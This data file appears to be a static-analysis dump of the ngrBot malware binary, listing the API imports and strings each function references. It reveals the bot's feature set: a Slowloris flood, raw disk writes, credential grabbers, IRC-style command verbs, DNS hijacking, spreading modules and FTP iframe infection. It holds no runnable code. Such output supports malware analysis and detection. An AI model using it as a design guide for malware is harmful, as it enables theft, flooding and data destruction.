reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x779a2d	0x781174	import	0x7799b0	KERNEL32.dll.GetTickCount
0x779a60	0x781174	import	0x7799b0	KERNEL32.dll.GetTickCount
0x779abe	0x781188	import	0x7799b0	KERNEL32.dll.Sleep
0x779ae7	0x781120	import	0x7799b0	KERNEL32.dll.lstrcpyA
0x779af0	0x782a08	string	0x7799b0	X-a: b\r\n
0x779b00	0x7829f0	string	0x7799b0	Connection: Close\r\n\r\n
0x779b0f	0x781184	import	0x7799b0	KERNEL32.dll.lstrlenA
0x779b51	0x781188	import	0x7799b0	KERNEL32.dll.Sleep
0x779b5e	0x781184	import	0x7799b0	KERNEL32.dll.lstrlenA
0x779b66	0x781174	import	0x7799b0	KERNEL32.dll.GetTickCount
0x779b7f	0x781188	import	0x7799b0	KERNEL32.dll.Sleep
0x779bd2	0x781174	import	0x7799b0	KERNEL32.dll.GetTickCount
0x779be4	0x781184	import	0x7799b0	KERNEL32.dll.lstrlenA
0x779c43	0x781174	import	0x7799b0	KERNEL32.dll.GetTickCount
0x779c9a	0x781180	import	0x779c60	KERNEL32.dll.HeapFree
0x779cb3	0x781120	import	0x779c60	KERNEL32.dll.lstrcpyA
0x779cc4	0x7810a0	import	0x779c60	KERNEL32.dll.lstrcpynA
0x779cf9	0x785e30	string	0x779c60	[Slowloris]: Starting flood on "%s" for %d minute(s)
0x779d45	0x785e68	string	0x779c60	[Slowloris]: Finished flood on "%s"
0x779d73	0x781180	import	0x779c60	KERNEL32.dll.HeapFree
0x779da7	0x781094	import	0x779d90	KERNEL32.dll.VirtualAlloc
0x779dd0	0x782a14	string	0x779d90	\\.\PHYSICALDRIVE0
0x779dd5	0x781110	import	0x779d90	KERNEL32.dll.CreateFileA
0x779e02	0x781098	import	0x779d90	KERNEL32.dll.DeviceIoControl
0x779e21	0x78109c	import	0x779d90	KERNEL32.dll.SetFilePointer
0x779e2a	0x781164	import	0x779d90	KERNEL32.dll.WriteFile
0x779e56	0x78109c	import	0x779d90	KERNEL32.dll.SetFilePointer
0x779ea2	0x781098	import	0x779d90	KERNEL32.dll.DeviceIoControl
0x779eec	0x782a28	string	0x779ec0	00100
0x779f09	0x782a14	string	0x779ec0	\\.\PHYSICALDRIVE0
0x779f16	0x781110	import	0x779ec0	KERNEL32.dll.CreateFileA
0x779f2b	0x781098	import	0x779ec0	KERNEL32.dll.DeviceIoControl
0x779f5a	0x781164	import	0x779ec0	KERNEL32.dll.WriteFile
0x779f77	0x781150	import	0x779ec0	KERNEL32.dll.CloseHandle
0x77a0a2	0x781158	import	0x77a080	KERNEL32.dll.CreateFileW
0x77a0c0	0x781164	import	0x77a080	KERNEL32.dll.WriteFile
0x77a0cb	0x781150	import	0x77a080	KERNEL32.dll.CloseHandle
0x77a0d8	0x781150	import	0x77a080	KERNEL32.dll.CloseHandle
0x77a184	0x7810c8	import	0x77a150	KERNEL32.dll.GetWindowsDirectoryW
0x77a2ab	0x781090	import	0x77a260	KERNEL32.dll.CreateProcessW
0x77a2c5	0x781174	import	0x77a2c0	KERNEL32.dll.GetTickCount
0x77a39f	0x781184	import	0x77a310	KERNEL32.dll.lstrlenA
0x77a3a8	0x7857a0	string	0x77a310	30e4}qa1
0x77a3b0	0x7857a0	string	0x77a310	30e4}qa1
0x77a3bb	0x786904	string	0x77a310	\\.\pipe\%08x_ipc
0x77a3fd	0x7857a0	string	0x77a310	30e4}qa1
0x77a40e	0x7857a0	string	0x77a310	30e4}qa1
0x77a436	0x78119c	import	0x77a310	KERNEL32.dll.EnterCriticalSection
0x77a452	0x781110	import	0x77a310	KERNEL32.dll.CreateFileA
0x77a464	0x781198	import	0x77a310	KERNEL32.dll.LeaveCriticalSection
0x77a484	0x781164	import	0x77a310	KERNEL32.dll.WriteFile
0x77a48b	0x781150	import	0x77a310	KERNEL32.dll.CloseHandle
0x77a496	0x781188	import	0x77a310	KERNEL32.dll.Sleep
0x77a4a1	0x781198	import	0x77a310	KERNEL32.dll.LeaveCriticalSection
0x77a557	0x782a48	string	0x77a550	NtShutdownSystem
0x77a55c	0x7816e8	string	0x77a550	ntdll.dll
0x77a57a	0x781024	import	0x77a550	ADVAPI32.dll.OpenProcessToken
0x77a588	0x782a34	string	0x77a550	SeShutdownPrivilege
0x77a58f	0x781028	import	0x77a550	ADVAPI32.dll.LookupPrivilegeValueA
0x77a5b3	0x78102c	import	0x77a550	ADVAPI32.dll.AdjustTokenPrivileges
0x77a5b9	0x78116c	import	0x77a550	KERNEL32.dll.GetLastError
0x77a659	0x7810cc	import	0x77a5d0	KERNEL32.dll.CreateThread
0x77a661	0x782ad4	string	0x77a5d0	ngrBot Error
0x77a666	0x782a60	string	0x77a5d0	This binary is invalid.\r\n\r\nMain reasons:\r\n- you stupid cracker\r\n- you stupid cracker...\r\n- you stupid cracker?!\r\n
0x77a66f	0x7812a4	import	0x77a5d0	USER32.dll.MessageBoxA
0x77a678	0x7810f8	import	0x77a5d0	KERNEL32.dll.WaitForSingleObject
0x77a680	0x78108c	import	0x77a5d0	KERNEL32.dll.ExitProcess
0x77a6df	0x781238	import	0x77a690	SHELL32.dll.SHGetSpecialFolderPathW
0x77a6ed	0x781728	string	0x77a690	Internet Explorer\iexplore.exe
0x77a6f9	0x781240	import	0x77a690	SHLWAPI.dll.PathAppendW
0x77a70a	0x782af0	string	0x77a690	"%s" %S
0x77a77f	0x781090	import	0x77a690	KERNEL32.dll.CreateProcessW
0x77a7aa	0x781174	import	0x77a790	KERNEL32.dll.GetTickCount
0x77a7dc	0x781188	import	0x77a790	KERNEL32.dll.Sleep
0x77a819	0x781174	import	0x77a800	KERNEL32.dll.GetTickCount
0x77a859	0x781188	import	0x77a800	KERNEL32.dll.Sleep
0x77a8b1	0x781534	string	0x77a880	msnu
0x77a8bd	0x781330	string	0x77a880	pdef
0x77a8c9	0x781b04	string	0x77a880	ffgrab
0x77a8d5	0x781b0c	string	0x77a880	iegrab
0x77a8e1	0x781a9c	string	0x77a880	ftpgrab
0x77a8ed	0x781a68	string	0x77a880	popgrab
0x77a8fc	0x7813e4	string	0x77a880	bdns
0x77a908	0x782b1c	string	0x77a880	usbi
0x77a914	0x782b14	string	0x77a880	httpi
0x77a946	0x782b04	string	0x77a880	http
0x77a956	0x782b04	string	0x77a880	http
0x77a970	0x782b30	string	0x77a970	DnsFlushResolverCache
0x77a975	0x782b24	string	0x77a970	dnsapi.dll
0x77a9ed	0x781090	import	0x77a990	KERNEL32.dll.CreateProcessW
0x77aa39	0x7829e0	string	0x77aa10	Mozilla/4.0
0x77aa45	0x781120	import	0x77aa10	KERNEL32.dll.lstrcpyA
0x77aa60	0x7812b8	import	0x77aa10	WININET.dll.InternetOpenA
0x77aa78	0x781184	import	0x77aa10	KERNEL32.dll.lstrlenA
0x77aa8c	0x7812b4	import	0x77aa10	WININET.dll.InternetOpenUrlA
0x77aac0	0x7812b0	import	0x77aa10	WININET.dll.HttpQueryInfoA
0x77aae2	0x7812ac	import	0x77aa10	WININET.dll.InternetQueryDataAvailable
0x77ab00	0x7812c8	import	0x77aa10	WININET.dll.InternetReadFile
0x77abe7	0x7812c4	import	0x77aa10	WININET.dll.InternetCloseHandle
0x77ac1a	0x781178	import	0x77ac00	KERNEL32.dll.HeapAlloc
0x77ac29	0x7812bc	import	0x77ac00	WININET.dll.HttpQueryInfoW
0x77ac44	0x78116c	import	0x77ac00	KERNEL32.dll.GetLastError
0x77ac5e	0x7811a0	import	0x77ac00	KERNEL32.dll.HeapReAlloc
0x77ac80	0x782b48	string	0x77ac00	POST
0x77ac85	0x781134	import	0x77ac00	KERNEL32.dll.lstrcmpW
0x77ac99	0x781180	import	0x77ac00	KERNEL32.dll.HeapFree
0x77acb2	0x781180	import	0x77ac00	KERNEL32.dll.HeapFree
0x77ad0a	0x781178	import	0x77acd0	KERNEL32.dll.HeapAlloc
0x77ad1a	0x7812c0	import	0x77acd0	WININET.dll.InternetQueryOptionW
0x77ad31	0x78116c	import	0x77acd0	KERNEL32.dll.GetLastError
0x77ad4f	0x7811a0	import	0x77acd0	KERNEL32.dll.HeapReAlloc
0x77ad80	0x78112c	import	0x77acd0	KERNEL32.dll.WideCharToMultiByte
0x77adb3	0x781120	import	0x77acd0	KERNEL32.dll.lstrcpyA
0x77ade6	0x781180	import	0x77acd0	KERNEL32.dll.HeapFree
0x77ae05	0x781184	import	0x77ae00	KERNEL32.dll.lstrlenA
0x77ae13	0x781178	import	0x77ae00	KERNEL32.dll.HeapAlloc
0x77ae69	0x781120	import	0x77ae00	KERNEL32.dll.lstrcpyA
0x77ae7f	0x781088	import	0x77ae00	KERNEL32.dll.lstrcatA
0x77aeb0	0x77af0a	string	0x77ae00	hT+x
0x77aed5	0x781180	import	0x77ae00	KERNEL32.dll.HeapFree
0x77aeeb	0x781180	import	0x77ae00	KERNEL32.dll.HeapFree
0x77af58	0x781120	import	0x77ae00	KERNEL32.dll.lstrcpyA
0x77af70	0x781180	import	0x77ae00	KERNEL32.dll.HeapFree
0x77afaf	0x781184	import	0x77afa0	KERNEL32.dll.lstrlenA
0x77afcb	0x781178	import	0x77afa0	KERNEL32.dll.HeapAlloc
0x77b024	0x782b88	string	0x77afa0	POST /%1023s
0x77b055	0x782b7c	string	0x77afa0	Host:
0x77b08e	0x7810a0	import	0x77afa0	KERNEL32.dll.lstrcpynA
0x77b0d5	0x781178	import	0x77afa0	KERNEL32.dll.HeapAlloc
0x77b0e3	0x782b74	string	0x77afa0	HTTP
0x77b0ff	0x782b68	string	0x77afa0	http://%s/
0x77b11e	0x782b58	string	0x77afa0	http://%s/%s
0x77b13c	0x781180	import	0x77afa0	KERNEL32.dll.HeapFree
0x77b16a	0x781184	import	0x77b160	KERNEL32.dll.lstrlenA
0x77b186	0x781178	import	0x77b160	KERNEL32.dll.HeapAlloc
0x77b199	0x782b98	string	0x77b160	\r\n\r\n
0x77b1d2	0x781178	import	0x77b160	KERNEL32.dll.HeapAlloc
0x77b1e5	0x7810a0	import	0x77b160	KERNEL32.dll.lstrcpynA
0x77b1f8	0x781180	import	0x77b160	KERNEL32.dll.HeapFree
0x77b2ee	0x77b2b0	string	0x77b290	<%u2
0x77b312	0x78117c	import	0x77b300	KERNEL32.dll.GetProcessHeap
0x77b319	0x781178	import	0x77b300	KERNEL32.dll.HeapAlloc
0x77b366	0x782bb4	string	0x77b300	lol.exe
0x77b387	0x7810c8	import	0x77b300	KERNEL32.dll.GetWindowsDirectoryW
0x77b3a1	0x7810b8	import	0x77b300	KERNEL32.dll.lstrcpynW
0x77b3bb	0x781084	import	0x77b300	KERNEL32.dll.GetVolumeInformationW
0x77b3cd	0x781184	import	0x77b300	KERNEL32.dll.lstrlenA
0x77b3d3	0x7857a0	string	0x77b300	30e4}qa1
0x77b3ea	0x7857a0	string	0x77b300	30e4}qa1
0x77b45b	0x782ba0	string	0x77b300	.exe
0x77b461	0x7810bc	import	0x77b300	KERNEL32.dll.lstrcatW
0x77b4a9	0x782c18	string	0x77b480	isadmin
0x77b4ae	0x782c10	string	0x77b480	admin
0x77b4fe	0x781120	import	0x77b480	KERNEL32.dll.lstrcpyA
0x77b536	0x781178	import	0x77b480	KERNEL32.dll.HeapAlloc
0x77b550	0x7810d8	import	0x77b480	KERNEL32.dll.GetVersionExA
0x77b60d	0x781178	import	0x77b480	KERNEL32.dll.HeapAlloc
0x77b620	0x7868e8	string	0x77b480	http://api.wipmania.com/
0x77b63b	0x782be8	string	0x77b480	<br>
0x77b650	0x781184	import	0x77b480	KERNEL32.dll.lstrlenA
0x77b65f	0x781184	import	0x77b480	KERNEL32.dll.lstrlenA
0x77b67d	0x781080	import	0x77b480	KERNEL32.dll.GetLocaleInfoA
0x77b6a8	0x781128	import	0x77b480	KERNEL32.dll.lstrcmpA
0x77b6c5	0x781080	import	0x77b480	KERNEL32.dll.GetLocaleInfoA
0x77b6f9	0x781080	import	0x77b480	KERNEL32.dll.GetLocaleInfoA
0x77b741	0x781178	import	0x77b480	KERNEL32.dll.HeapAlloc
0x77b7f1	0x782bd0	string	0x77b480	N%s|%s|%s%s|%s
0x77b80b	0x782bc4	string	0x77b480	|%s|%s%s|%s
0x77b8be	0x782bd0	string	0x77b480	N%s|%s|%s%s|%s
0x77b8d5	0x782bc4	string	0x77b480	|%s|%s%s|%s
0x77b94b	0x782c20	string	0x77b900	127.0.0.1
0x77b975	0x781188	import	0x77b900	KERNEL32.dll.Sleep
0x77b9bc	0x78119c	import	0x77b990	KERNEL32.dll.EnterCriticalSection
0x77b9d1	0x7812a0	import	0x77b990	USER32.dll.wvsprintfA
0x77b9f2	0x781198	import	0x77b990	KERNEL32.dll.LeaveCriticalSection
0x77ba42	0x7812a0	import	0x77ba00	USER32.dll.wvsprintfA
0x77ba56	0x785d4c	string	0x77ba00	PPPPMSG %s :%s\r\n
0x77ba7f	0x785c54	string	0x77ba70	PASS %s\r\n
0x77ba9c	0x785d24	string	0x77ba70	KCIK %s\r\n
0x77bab4	0x785d10	string	0x77ba70	SSRR %s 0 0 :%s\r\n
0x77bb52	0x781184	import	0x77bb30	KERNEL32.dll.lstrlenA
0x77bba0	0x781128	import	0x77bb80	KERNEL32.dll.lstrcmpA
0x77bbff	0x781128	import	0x77bbb0	KERNEL32.dll.lstrcmpA
0x77bc2c	0x7857a0	string	0x77bbb0	30e4}qa1
0x77bc36	0x785d88	string	0x77bbb0	[v="%s" c="%s" h="%s" p="%S"]
0x77bc89	0x782cf4	string	0x77bbb0	reconnecting
0x77bc8e	0x785d60	string	0x77bbb0	QUIT :%s\r\n
0x77bcc3	0x781184	import	0x77bbb0	KERNEL32.dll.lstrlenA
0x77bce1	0x781180	import	0x77bbb0	KERNEL32.dll.HeapFree
0x77bcec	0x782cf4	string	0x77bbb0	reconnecting
0x77bcf1	0x785d60	string	0x77bbb0	QUIT :%s\r\n
0x77bd28	0x782ce8	string	0x77bbb0	exiting
0x77bd2d	0x785d60	string	0x77bbb0	QUIT :%s\r\n
0x77bd5a	0x782cdc	string	0x77bbb0	removing
0x77bd5f	0x785d60	string	0x77bbb0	QUIT :%s\r\n
0x77bdb2	0x781120	import	0x77bbb0	KERNEL32.dll.lstrcpyA
0x77bdc6	0x781088	import	0x77bbb0	KERNEL32.dll.lstrcatA
0x77bdd5	0x785d30	string	0x77bbb0	SEND %s %s\r\n
0x77be0c	0x782ccc	string	0x77bbb0	#new
0x77be18	0x781120	import	0x77bbb0	KERNEL32.dll.lstrcpyA
0x77be2a	0x785d30	string	0x77bbb0	SEND %s %s\r\n
0x77be72	0x782cbc	string	0x77bbb0	#admin
0x77be79	0x782cb4	string	0x77bbb0	#user
0x77be7f	0x781120	import	0x77bbb0	KERNEL32.dll.lstrcpyA
0x77be91	0x785d30	string	0x77bbb0	SEND %s %s\r\n
0x77becb	0x781120	import	0x77bbb0	KERNEL32.dll.lstrcpyA
0x77bee7	0x781120	import	0x77bbb0	KERNEL32.dll.lstrcpyA
0x77befa	0x781088	import	0x77bbb0	KERNEL32.dll.lstrcatA
0x77bf0c	0x785d30	string	0x77bbb0	SEND %s %s\r\n
0x77bf5f	0x781120	import	0x77bbb0	KERNEL32.dll.lstrcpyA
0x77bf73	0x781088	import	0x77bbb0	KERNEL32.dll.lstrcatA
0x77bf82	0x785d40	string	0x77bbb0	PART %s\r\n
0x77bfa6	0x782ccc	string	0x77bbb0	#new
0x77bfb2	0x781120	import	0x77bbb0	KERNEL32.dll.lstrcpyA
0x77bfc4	0x785d40	string	0x77bbb0	PART %s\r\n
0x77c00c	0x782cbc	string	0x77bbb0	#admin
0x77c013	0x782cb4	string	0x77bbb0	#user
0x77c019	0x781120	import	0x77bbb0	KERNEL32.dll.lstrcpyA
0x77c02b	0x785d40	string	0x77bbb0	PART %s\r\n
0x77c065	0x781120	import	0x77bbb0	KERNEL32.dll.lstrcpyA
0x77c081	0x781120	import	0x77bbb0	KERNEL32.dll.lstrcpyA
0x77c094	0x781088	import	0x77bbb0	KERNEL32.dll.lstrcatA
0x77c0a6	0x785d40	string	0x77bbb0	PART %s\r\n
0x77c0c3	0x785874	string	0x77bbb0	stop
0x77c0e3	0x785840	string	0x77bbb0	stats
0x77c124	0x786054	string	0x77bbb0	[usb="%d" msn="%d" http="%d" total="%d"]
0x77c156	0x786080	string	0x77bbb0	[ftp="%d" pop="%d" http="%d" total="%d"]
0x77c192	0x786054	string	0x77bbb0	[usb="%d" msn="%d" http="%d" total="%d"]
0x77c1b9	0x786080	string	0x77bbb0	[ftp="%d" pop="%d" http="%d" total="%d"]
0x77c1d2	0x785850	string	0x77bbb0	logins
0x77c225	0x781180	import	0x77bbb0	KERNEL32.dll.HeapFree
0x77c25e	0x782c88	string	0x77bbb0	[Logins]: Cleared %d logins
0x77c283	0x782c80	string	0x77bbb0	%s|%s
0x77c2c2	0x781184	import	0x77bbb0	KERNEL32.dll.lstrlenA
0x77c2d2	0x781178	import	0x77bbb0	KERNEL32.dll.HeapAlloc
0x77c2ea	0x781120	import	0x77bbb0	KERNEL32.dll.lstrcpyA
0x77c321	0x7860d0	string	0x77bbb0	[RSOCK4]: Stopped rsock4
0x77c33f	0x785848	string	0x77bbb0	speed
0x77c354	0x781120	import	0x77bbb0	KERNEL32.dll.lstrcpyA
0x77c3fd	0x7857f0	string	0x77bbb0	jps獵 blocks=Basic Latin,CJK Unified Ideographs
0x77c449	0x785d30	string	0x77bbb0	SEND %s %s\r\n
0x77c4bf	0x785d30	string	0x77bbb0	SEND %s %s\r\n
0x77c550	0x785d40	string	0x77bbb0	PART %s\r\n
0x77c572	0x785d40	string	0x77bbb0	PART %s\r\n
0x77c5d0	0x781330	string	0x77bbb0	pdef
0x77c5e2	0x781184	import	0x77bbb0	KERNEL32.dll.lstrlenA
0x77c5f7	0x781178	import	0x77bbb0	KERNEL32.dll.HeapAlloc
0x77c60e	0x781120	import	0x77bbb0	KERNEL32.dll.lstrcpyA
0x77c61f	0x781184	import	0x77bbb0	KERNEL32.dll.lstrlenA
0x77c633	0x781088	import	0x77bbb0	KERNEL32.dll.lstrcatA
0x77c642	0x781088	import	0x77bbb0	KERNEL32.dll.lstrcatA
0x77c679	0x781330	string	0x77bbb0	pdef
0x77c68f	0x781120	import	0x77bbb0	KERNEL32.dll.lstrcpyA
0x77c6d0	0x781120	import	0x77bbb0	KERNEL32.dll.lstrcpyA
0x77c6e0	0x781184	import	0x77bbb0	KERNEL32.dll.lstrlenA
0x77c706	0x781088	import	0x77bbb0	KERNEL32.dll.lstrcatA
0x77c73d	0x781120	import	0x77bbb0	KERNEL32.dll.lstrcpyA
0x77c743	0x781184	import	0x77bbb0	KERNEL32.dll.lstrlenA
0x77c77e	0x7814f8	string	0x77bbb0	msnmsg
0x77c7ce	0x785f50	string	0x77bbb0	[MSN]: Updated MSN spread message to "%s"
0x77c7e7	0x785808	string	0x77bbb0	msn.int
0x77c826	0x781500	string	0x77bbb0	msnint
0x77c859	0x781184	import	0x77bbb0	KERNEL32.dll.lstrlenA
0x77c876	0x785f7c	string	0x77bbb0	[MSN]: Updated MSN spread interval to "%s"
0x77c88f	0x785810	string	0x77bbb0	http.set
0x77c8b5	0x781120	import	0x77bbb0	KERNEL32.dll.lstrcpyA
0x77c8d0	0x781184	import	0x77bbb0	KERNEL32.dll.lstrlenA
0x77c8f5	0x781088	import	0x77bbb0	KERNEL32.dll.lstrcatA
0x77c92c	0x781120	import	0x77bbb0	KERNEL32.dll.lstrcpyA
0x77c955	0x782b04	string	0x77bbb0	http
0x77c972	0x785fa8	string	0x77bbb0	[HTTP]: Updated HTTP spread message to "%s"
0x77c97f	0x78581c	string	0x77bbb0	http.int
0x77c9c0	0x782b04	string	0x77bbb0	http
0x77c9df	0x785ff8	string	0x77bbb0	[HTTP]: Updated HTTP spread interval to "%s"
0x77c9f8	0x785828	string	0x77bbb0	http.inj
0x77ca16	0x782b14	string	0x77bbb0	httpi
0x77ca26	0x782c70	string	0x77bbb0	enabled
0x77ca2b	0x785fd4	string	0x77bbb0	[HTTP]: Injected value is now %s.
0x77ca43	0x782b14	string	0x77bbb0	httpi
0x77ca53	0x782c64	string	0x77bbb0	disabled
0x77ca58	0x785fd4	string	0x77bbb0	[HTTP]: Injected value is now %s.
0x77ca71	0x785838	string	0x77bbb0	mdns
0x77ca9f	0x781184	import	0x77bbb0	KERNEL32.dll.lstrlenA
0x77cadd	0x781178	import	0x77bbb0	KERNEL32.dll.HeapAlloc
0x77caf3	0x781120	import	0x77bbb0	KERNEL32.dll.lstrcpyA
0x77cb36	0x7813e4	string	0x77bbb0	bdns
0x77cb41	0x77a970	string	0x77bbb0	h0+x
0x77cb56	0x782c44	string	0x77bbb0	[DNS]: Redirecting "%s" to "%s"
0x77cb76	0x7813e4	string	0x77bbb0	bdns
0x77cb7b	0x7813dc	string	0x77bbb0	block
0x77cb85	0x77a970	string	0x77bbb0	h0+x
0x77cb95	0x786040	string	0x77bbb0	[DNS]: Blocked "%s"
0x77cbf2	0x77cc0a	string	0x77bbb0	h|bx
0x77cbf4	0x786028	string	0x77bbb0	[Visit]: Visited "%s"
0x77cc0a	0x78627c	string	0x77bbb0	[Visit]: Error visitng "%s"
0x77cc3a	0x781184	import	0x77bbb0	KERNEL32.dll.lstrlenA
0x77cc8b	0x782c34	string	0x77bbb0	%s|%s|%s
0x77cca8	0x782c80	string	0x77bbb0	%s|%s
0x77ccd4	0x781178	import	0x77bbb0	KERNEL32.dll.HeapAlloc
0x77cce4	0x781120	import	0x77bbb0	KERNEL32.dll.lstrcpyA
0x77cd11	0x785860	string	0x77bbb0	slow
0x77cd27	0x782c80	string	0x77bbb0	%s|%s
0x77cd47	0x781184	import	0x77bbb0	KERNEL32.dll.lstrlenA
0x77cd58	0x781178	import	0x77bbb0	KERNEL32.dll.HeapAlloc
0x77cd70	0x781120	import	0x77bbb0	KERNEL32.dll.lstrcpyA
0x77cdfc	0x781534	string	0x77bbb0	msnu
0x77ce55	0x781330	string	0x77bbb0	pdef
0x77ce66	0x781b04	string	0x77bbb0	ffgrab
0x77ce7b	0x781b0c	string	0x77bbb0	iegrab
0x77ce8c	0x781a9c	string	0x77bbb0	ftpgrab
0x77ce9d	0x781a68	string	0x77bbb0	popgrab
0x77ceb2	0x7813e4	string	0x77bbb0	bdns
0x77cec7	0x782b1c	string	0x77bbb0	usbi
0x77cf67	0x7860ac	string	0x77bbb0	[RSOCK4]: Started rsock4 on "%s:%d"
0x77cfe3	0x782c34	string	0x77bbb0	%s|%s|%s
0x77d003	0x781184	import	0x77bbb0	KERNEL32.dll.lstrlenA
0x77d013	0x781178	import	0x77bbb0	KERNEL32.dll.HeapAlloc
0x77d02b	0x781120	import	0x77bbb0	KERNEL32.dll.lstrcpyA
0x77d043	0x785868	string	0x77bbb0	ssyn
0x77d097	0x782c34	string	0x77bbb0	%s|%s|%s
0x77d0b7	0x781184	import	0x77bbb0	KERNEL32.dll.lstrlenA
0x77d0c8	0x781178	import	0x77bbb0	KERNEL32.dll.HeapAlloc
0x77d0dc	0x781120	import	0x77bbb0	KERNEL32.dll.lstrcpyA
0x77d0f0	0x7810cc	import	0x77bbb0	KERNEL32.dll.CreateThread
0x77d0f7	0x781150	import	0x77bbb0	KERNEL32.dll.CloseHandle
0x77d145	0x781128	import	0x77d110	KERNEL32.dll.lstrcmpA
0x77d18c	0x7810a0	import	0x77d110	KERNEL32.dll.lstrcpynA
0x77d198	0x781184	import	0x77d110	KERNEL32.dll.lstrlenA
0x77d231	0x781184	import	0x77d220	KERNEL32.dll.lstrlenA
0x77d243	0x782d18	string	0x77d220	MOTD
0x77d2b5	0x781128	import	0x77d220	KERNEL32.dll.lstrcmpA
0x77d2bb	0x785d78	string	0x77d220	PING
0x77d2d1	0x785d6c	string	0x77d220	PPNG %s\r\n
0x77d2f6	0x77d31d	string	0x77d220	h\f-x
0x77d308	0x785d30	string	0x77d220	SEND %s %s\r\n
0x77d33c	0x785d24	string	0x77d220	KCIK %s\r\n
0x77d351	0x7818c4	string	0x77d220	JOIN
0x77d37f	0x785d80	string	0x77d220	PPPPMSG
0x77d43c	0x785d30	string	0x77d220	SEND %s %s\r\n
0x77d5cd	0x7818d0	string	0x77d530	%s:%d
0x77d5e4	0x781188	import	0x77d530	KERNEL32.dll.Sleep
0x77d659	0x781188	import	0x77d530	KERNEL32.dll.Sleep
0x77d6fd	0x781018	import	0x77d6b0	ADVAPI32.dll.RegCreateKeyExW
0x77d731	0x781000	import	0x77d6b0	ADVAPI32.dll.RegSetValueExW
0x77d740	0x781020	import	0x77d6b0	ADVAPI32.dll.RegCloseKey
0x77d753	0x781020	import	0x77d6b0	ADVAPI32.dll.RegCloseKey
0x77d7b2	0x781178	import	0x77d7a0	KERNEL32.dll.HeapAlloc
0x77d80b	0x781180	import	0x77d7a0	KERNEL32.dll.HeapFree
0x77d819	0x781180	import	0x77d7a0	KERNEL32.dll.HeapFree
0x77d82f	0x78116c	import	0x77d7a0	KERNEL32.dll.GetLastError
0x77d83c	0x781180	import	0x77d7a0	KERNEL32.dll.HeapFree
0x77d852	0x78116c	import	0x77d7a0	KERNEL32.dll.GetLastError
0x77d85b	0x781180	import	0x77d7a0	KERNEL32.dll.HeapFree
0x77d87a	0x781170	import	0x77d7a0	KERNEL32.dll.ReadFile
0x77d8fa	0x7857a0	string	0x77d7a0	30e4}qa1
0x77d900	0x781184	import	0x77d7a0	KERNEL32.dll.lstrlenA
0x77d908	0x7857a0	string	0x77d7a0	30e4}qa1
0x77d916	0x781178	import	0x77d7a0	KERNEL32.dll.HeapAlloc
0x77d952	0x781184	import	0x77d7a0	KERNEL32.dll.lstrlenA
0x77d95e	0x7810a0	import	0x77d7a0	KERNEL32.dll.lstrcpynA
0x77d96d	0x7810a0	import	0x77d7a0	KERNEL32.dll.lstrcpynA
0x77d973	0x781128	import	0x77d7a0	KERNEL32.dll.lstrcmpA
0x77d979	0x7863a0	string	0x77d7a0	ftplog
0x77d98b	0x786298	string	0x77d7a0	[FTP Login]: %s
0x77d99f	0x781184	import	0x77d7a0	KERNEL32.dll.lstrlenA
0x77d9af	0x781178	import	0x77d7a0	KERNEL32.dll.HeapAlloc
0x77d9bb	0x782d3c	string	0x77d7a0	FTP ->
0x77d9c1	0x781120	import	0x77d7a0	KERNEL32.dll.lstrcpyA
0x77d9c9	0x781088	import	0x77d7a0	KERNEL32.dll.lstrcatA
0x77d9e8	0x7863a8	string	0x77d7a0	poplog
0x77d9fb	0x7862a8	string	0x77d7a0	[POP3 Login]: %s
0x77da0f	0x781184	import	0x77d7a0	KERNEL32.dll.lstrlenA
0x77da1f	0x781178	import	0x77d7a0	KERNEL32.dll.HeapAlloc
0x77da2b	0x782d30	string	0x77d7a0	POP3 ->
0x77da31	0x781120	import	0x77d7a0	KERNEL32.dll.lstrcpyA
0x77da39	0x781088	import	0x77d7a0	KERNEL32.dll.lstrcatA
0x77da58	0x7863b0	string	0x77d7a0	ftpinfect
0x77da6b	0x7862bc	string	0x77d7a0	[FTP Infect]: %s was iframed
0x77da83	0x7863c8	string	0x77d7a0	httptraff
0x77da96	0x7862f0	string	0x77d7a0	[HTTP Traffic]: %s
0x77daae	0x7863bc	string	0x77d7a0	httplogin
0x77dac0	0x7862dc	string	0x77d7a0	[HTTP Login]: %s
0x77dad4	0x781184	import	0x77d7a0	KERNEL32.dll.lstrlenA
0x77dae2	0x781178	import	0x77d7a0	KERNEL32.dll.HeapAlloc
0x77daf0	0x781120	import	0x77d7a0	KERNEL32.dll.lstrcpyA
0x77db0f	0x7863d4	string	0x77d7a0	ruskill
0x77db1b	0x782d28	string	0x77d7a0	disable
0x77db38	0x786304	string	0x77d7a0	[Ruskill]: Detected File: "%s"
0x77db50	0x7863dc	string	0x77d7a0	rdns
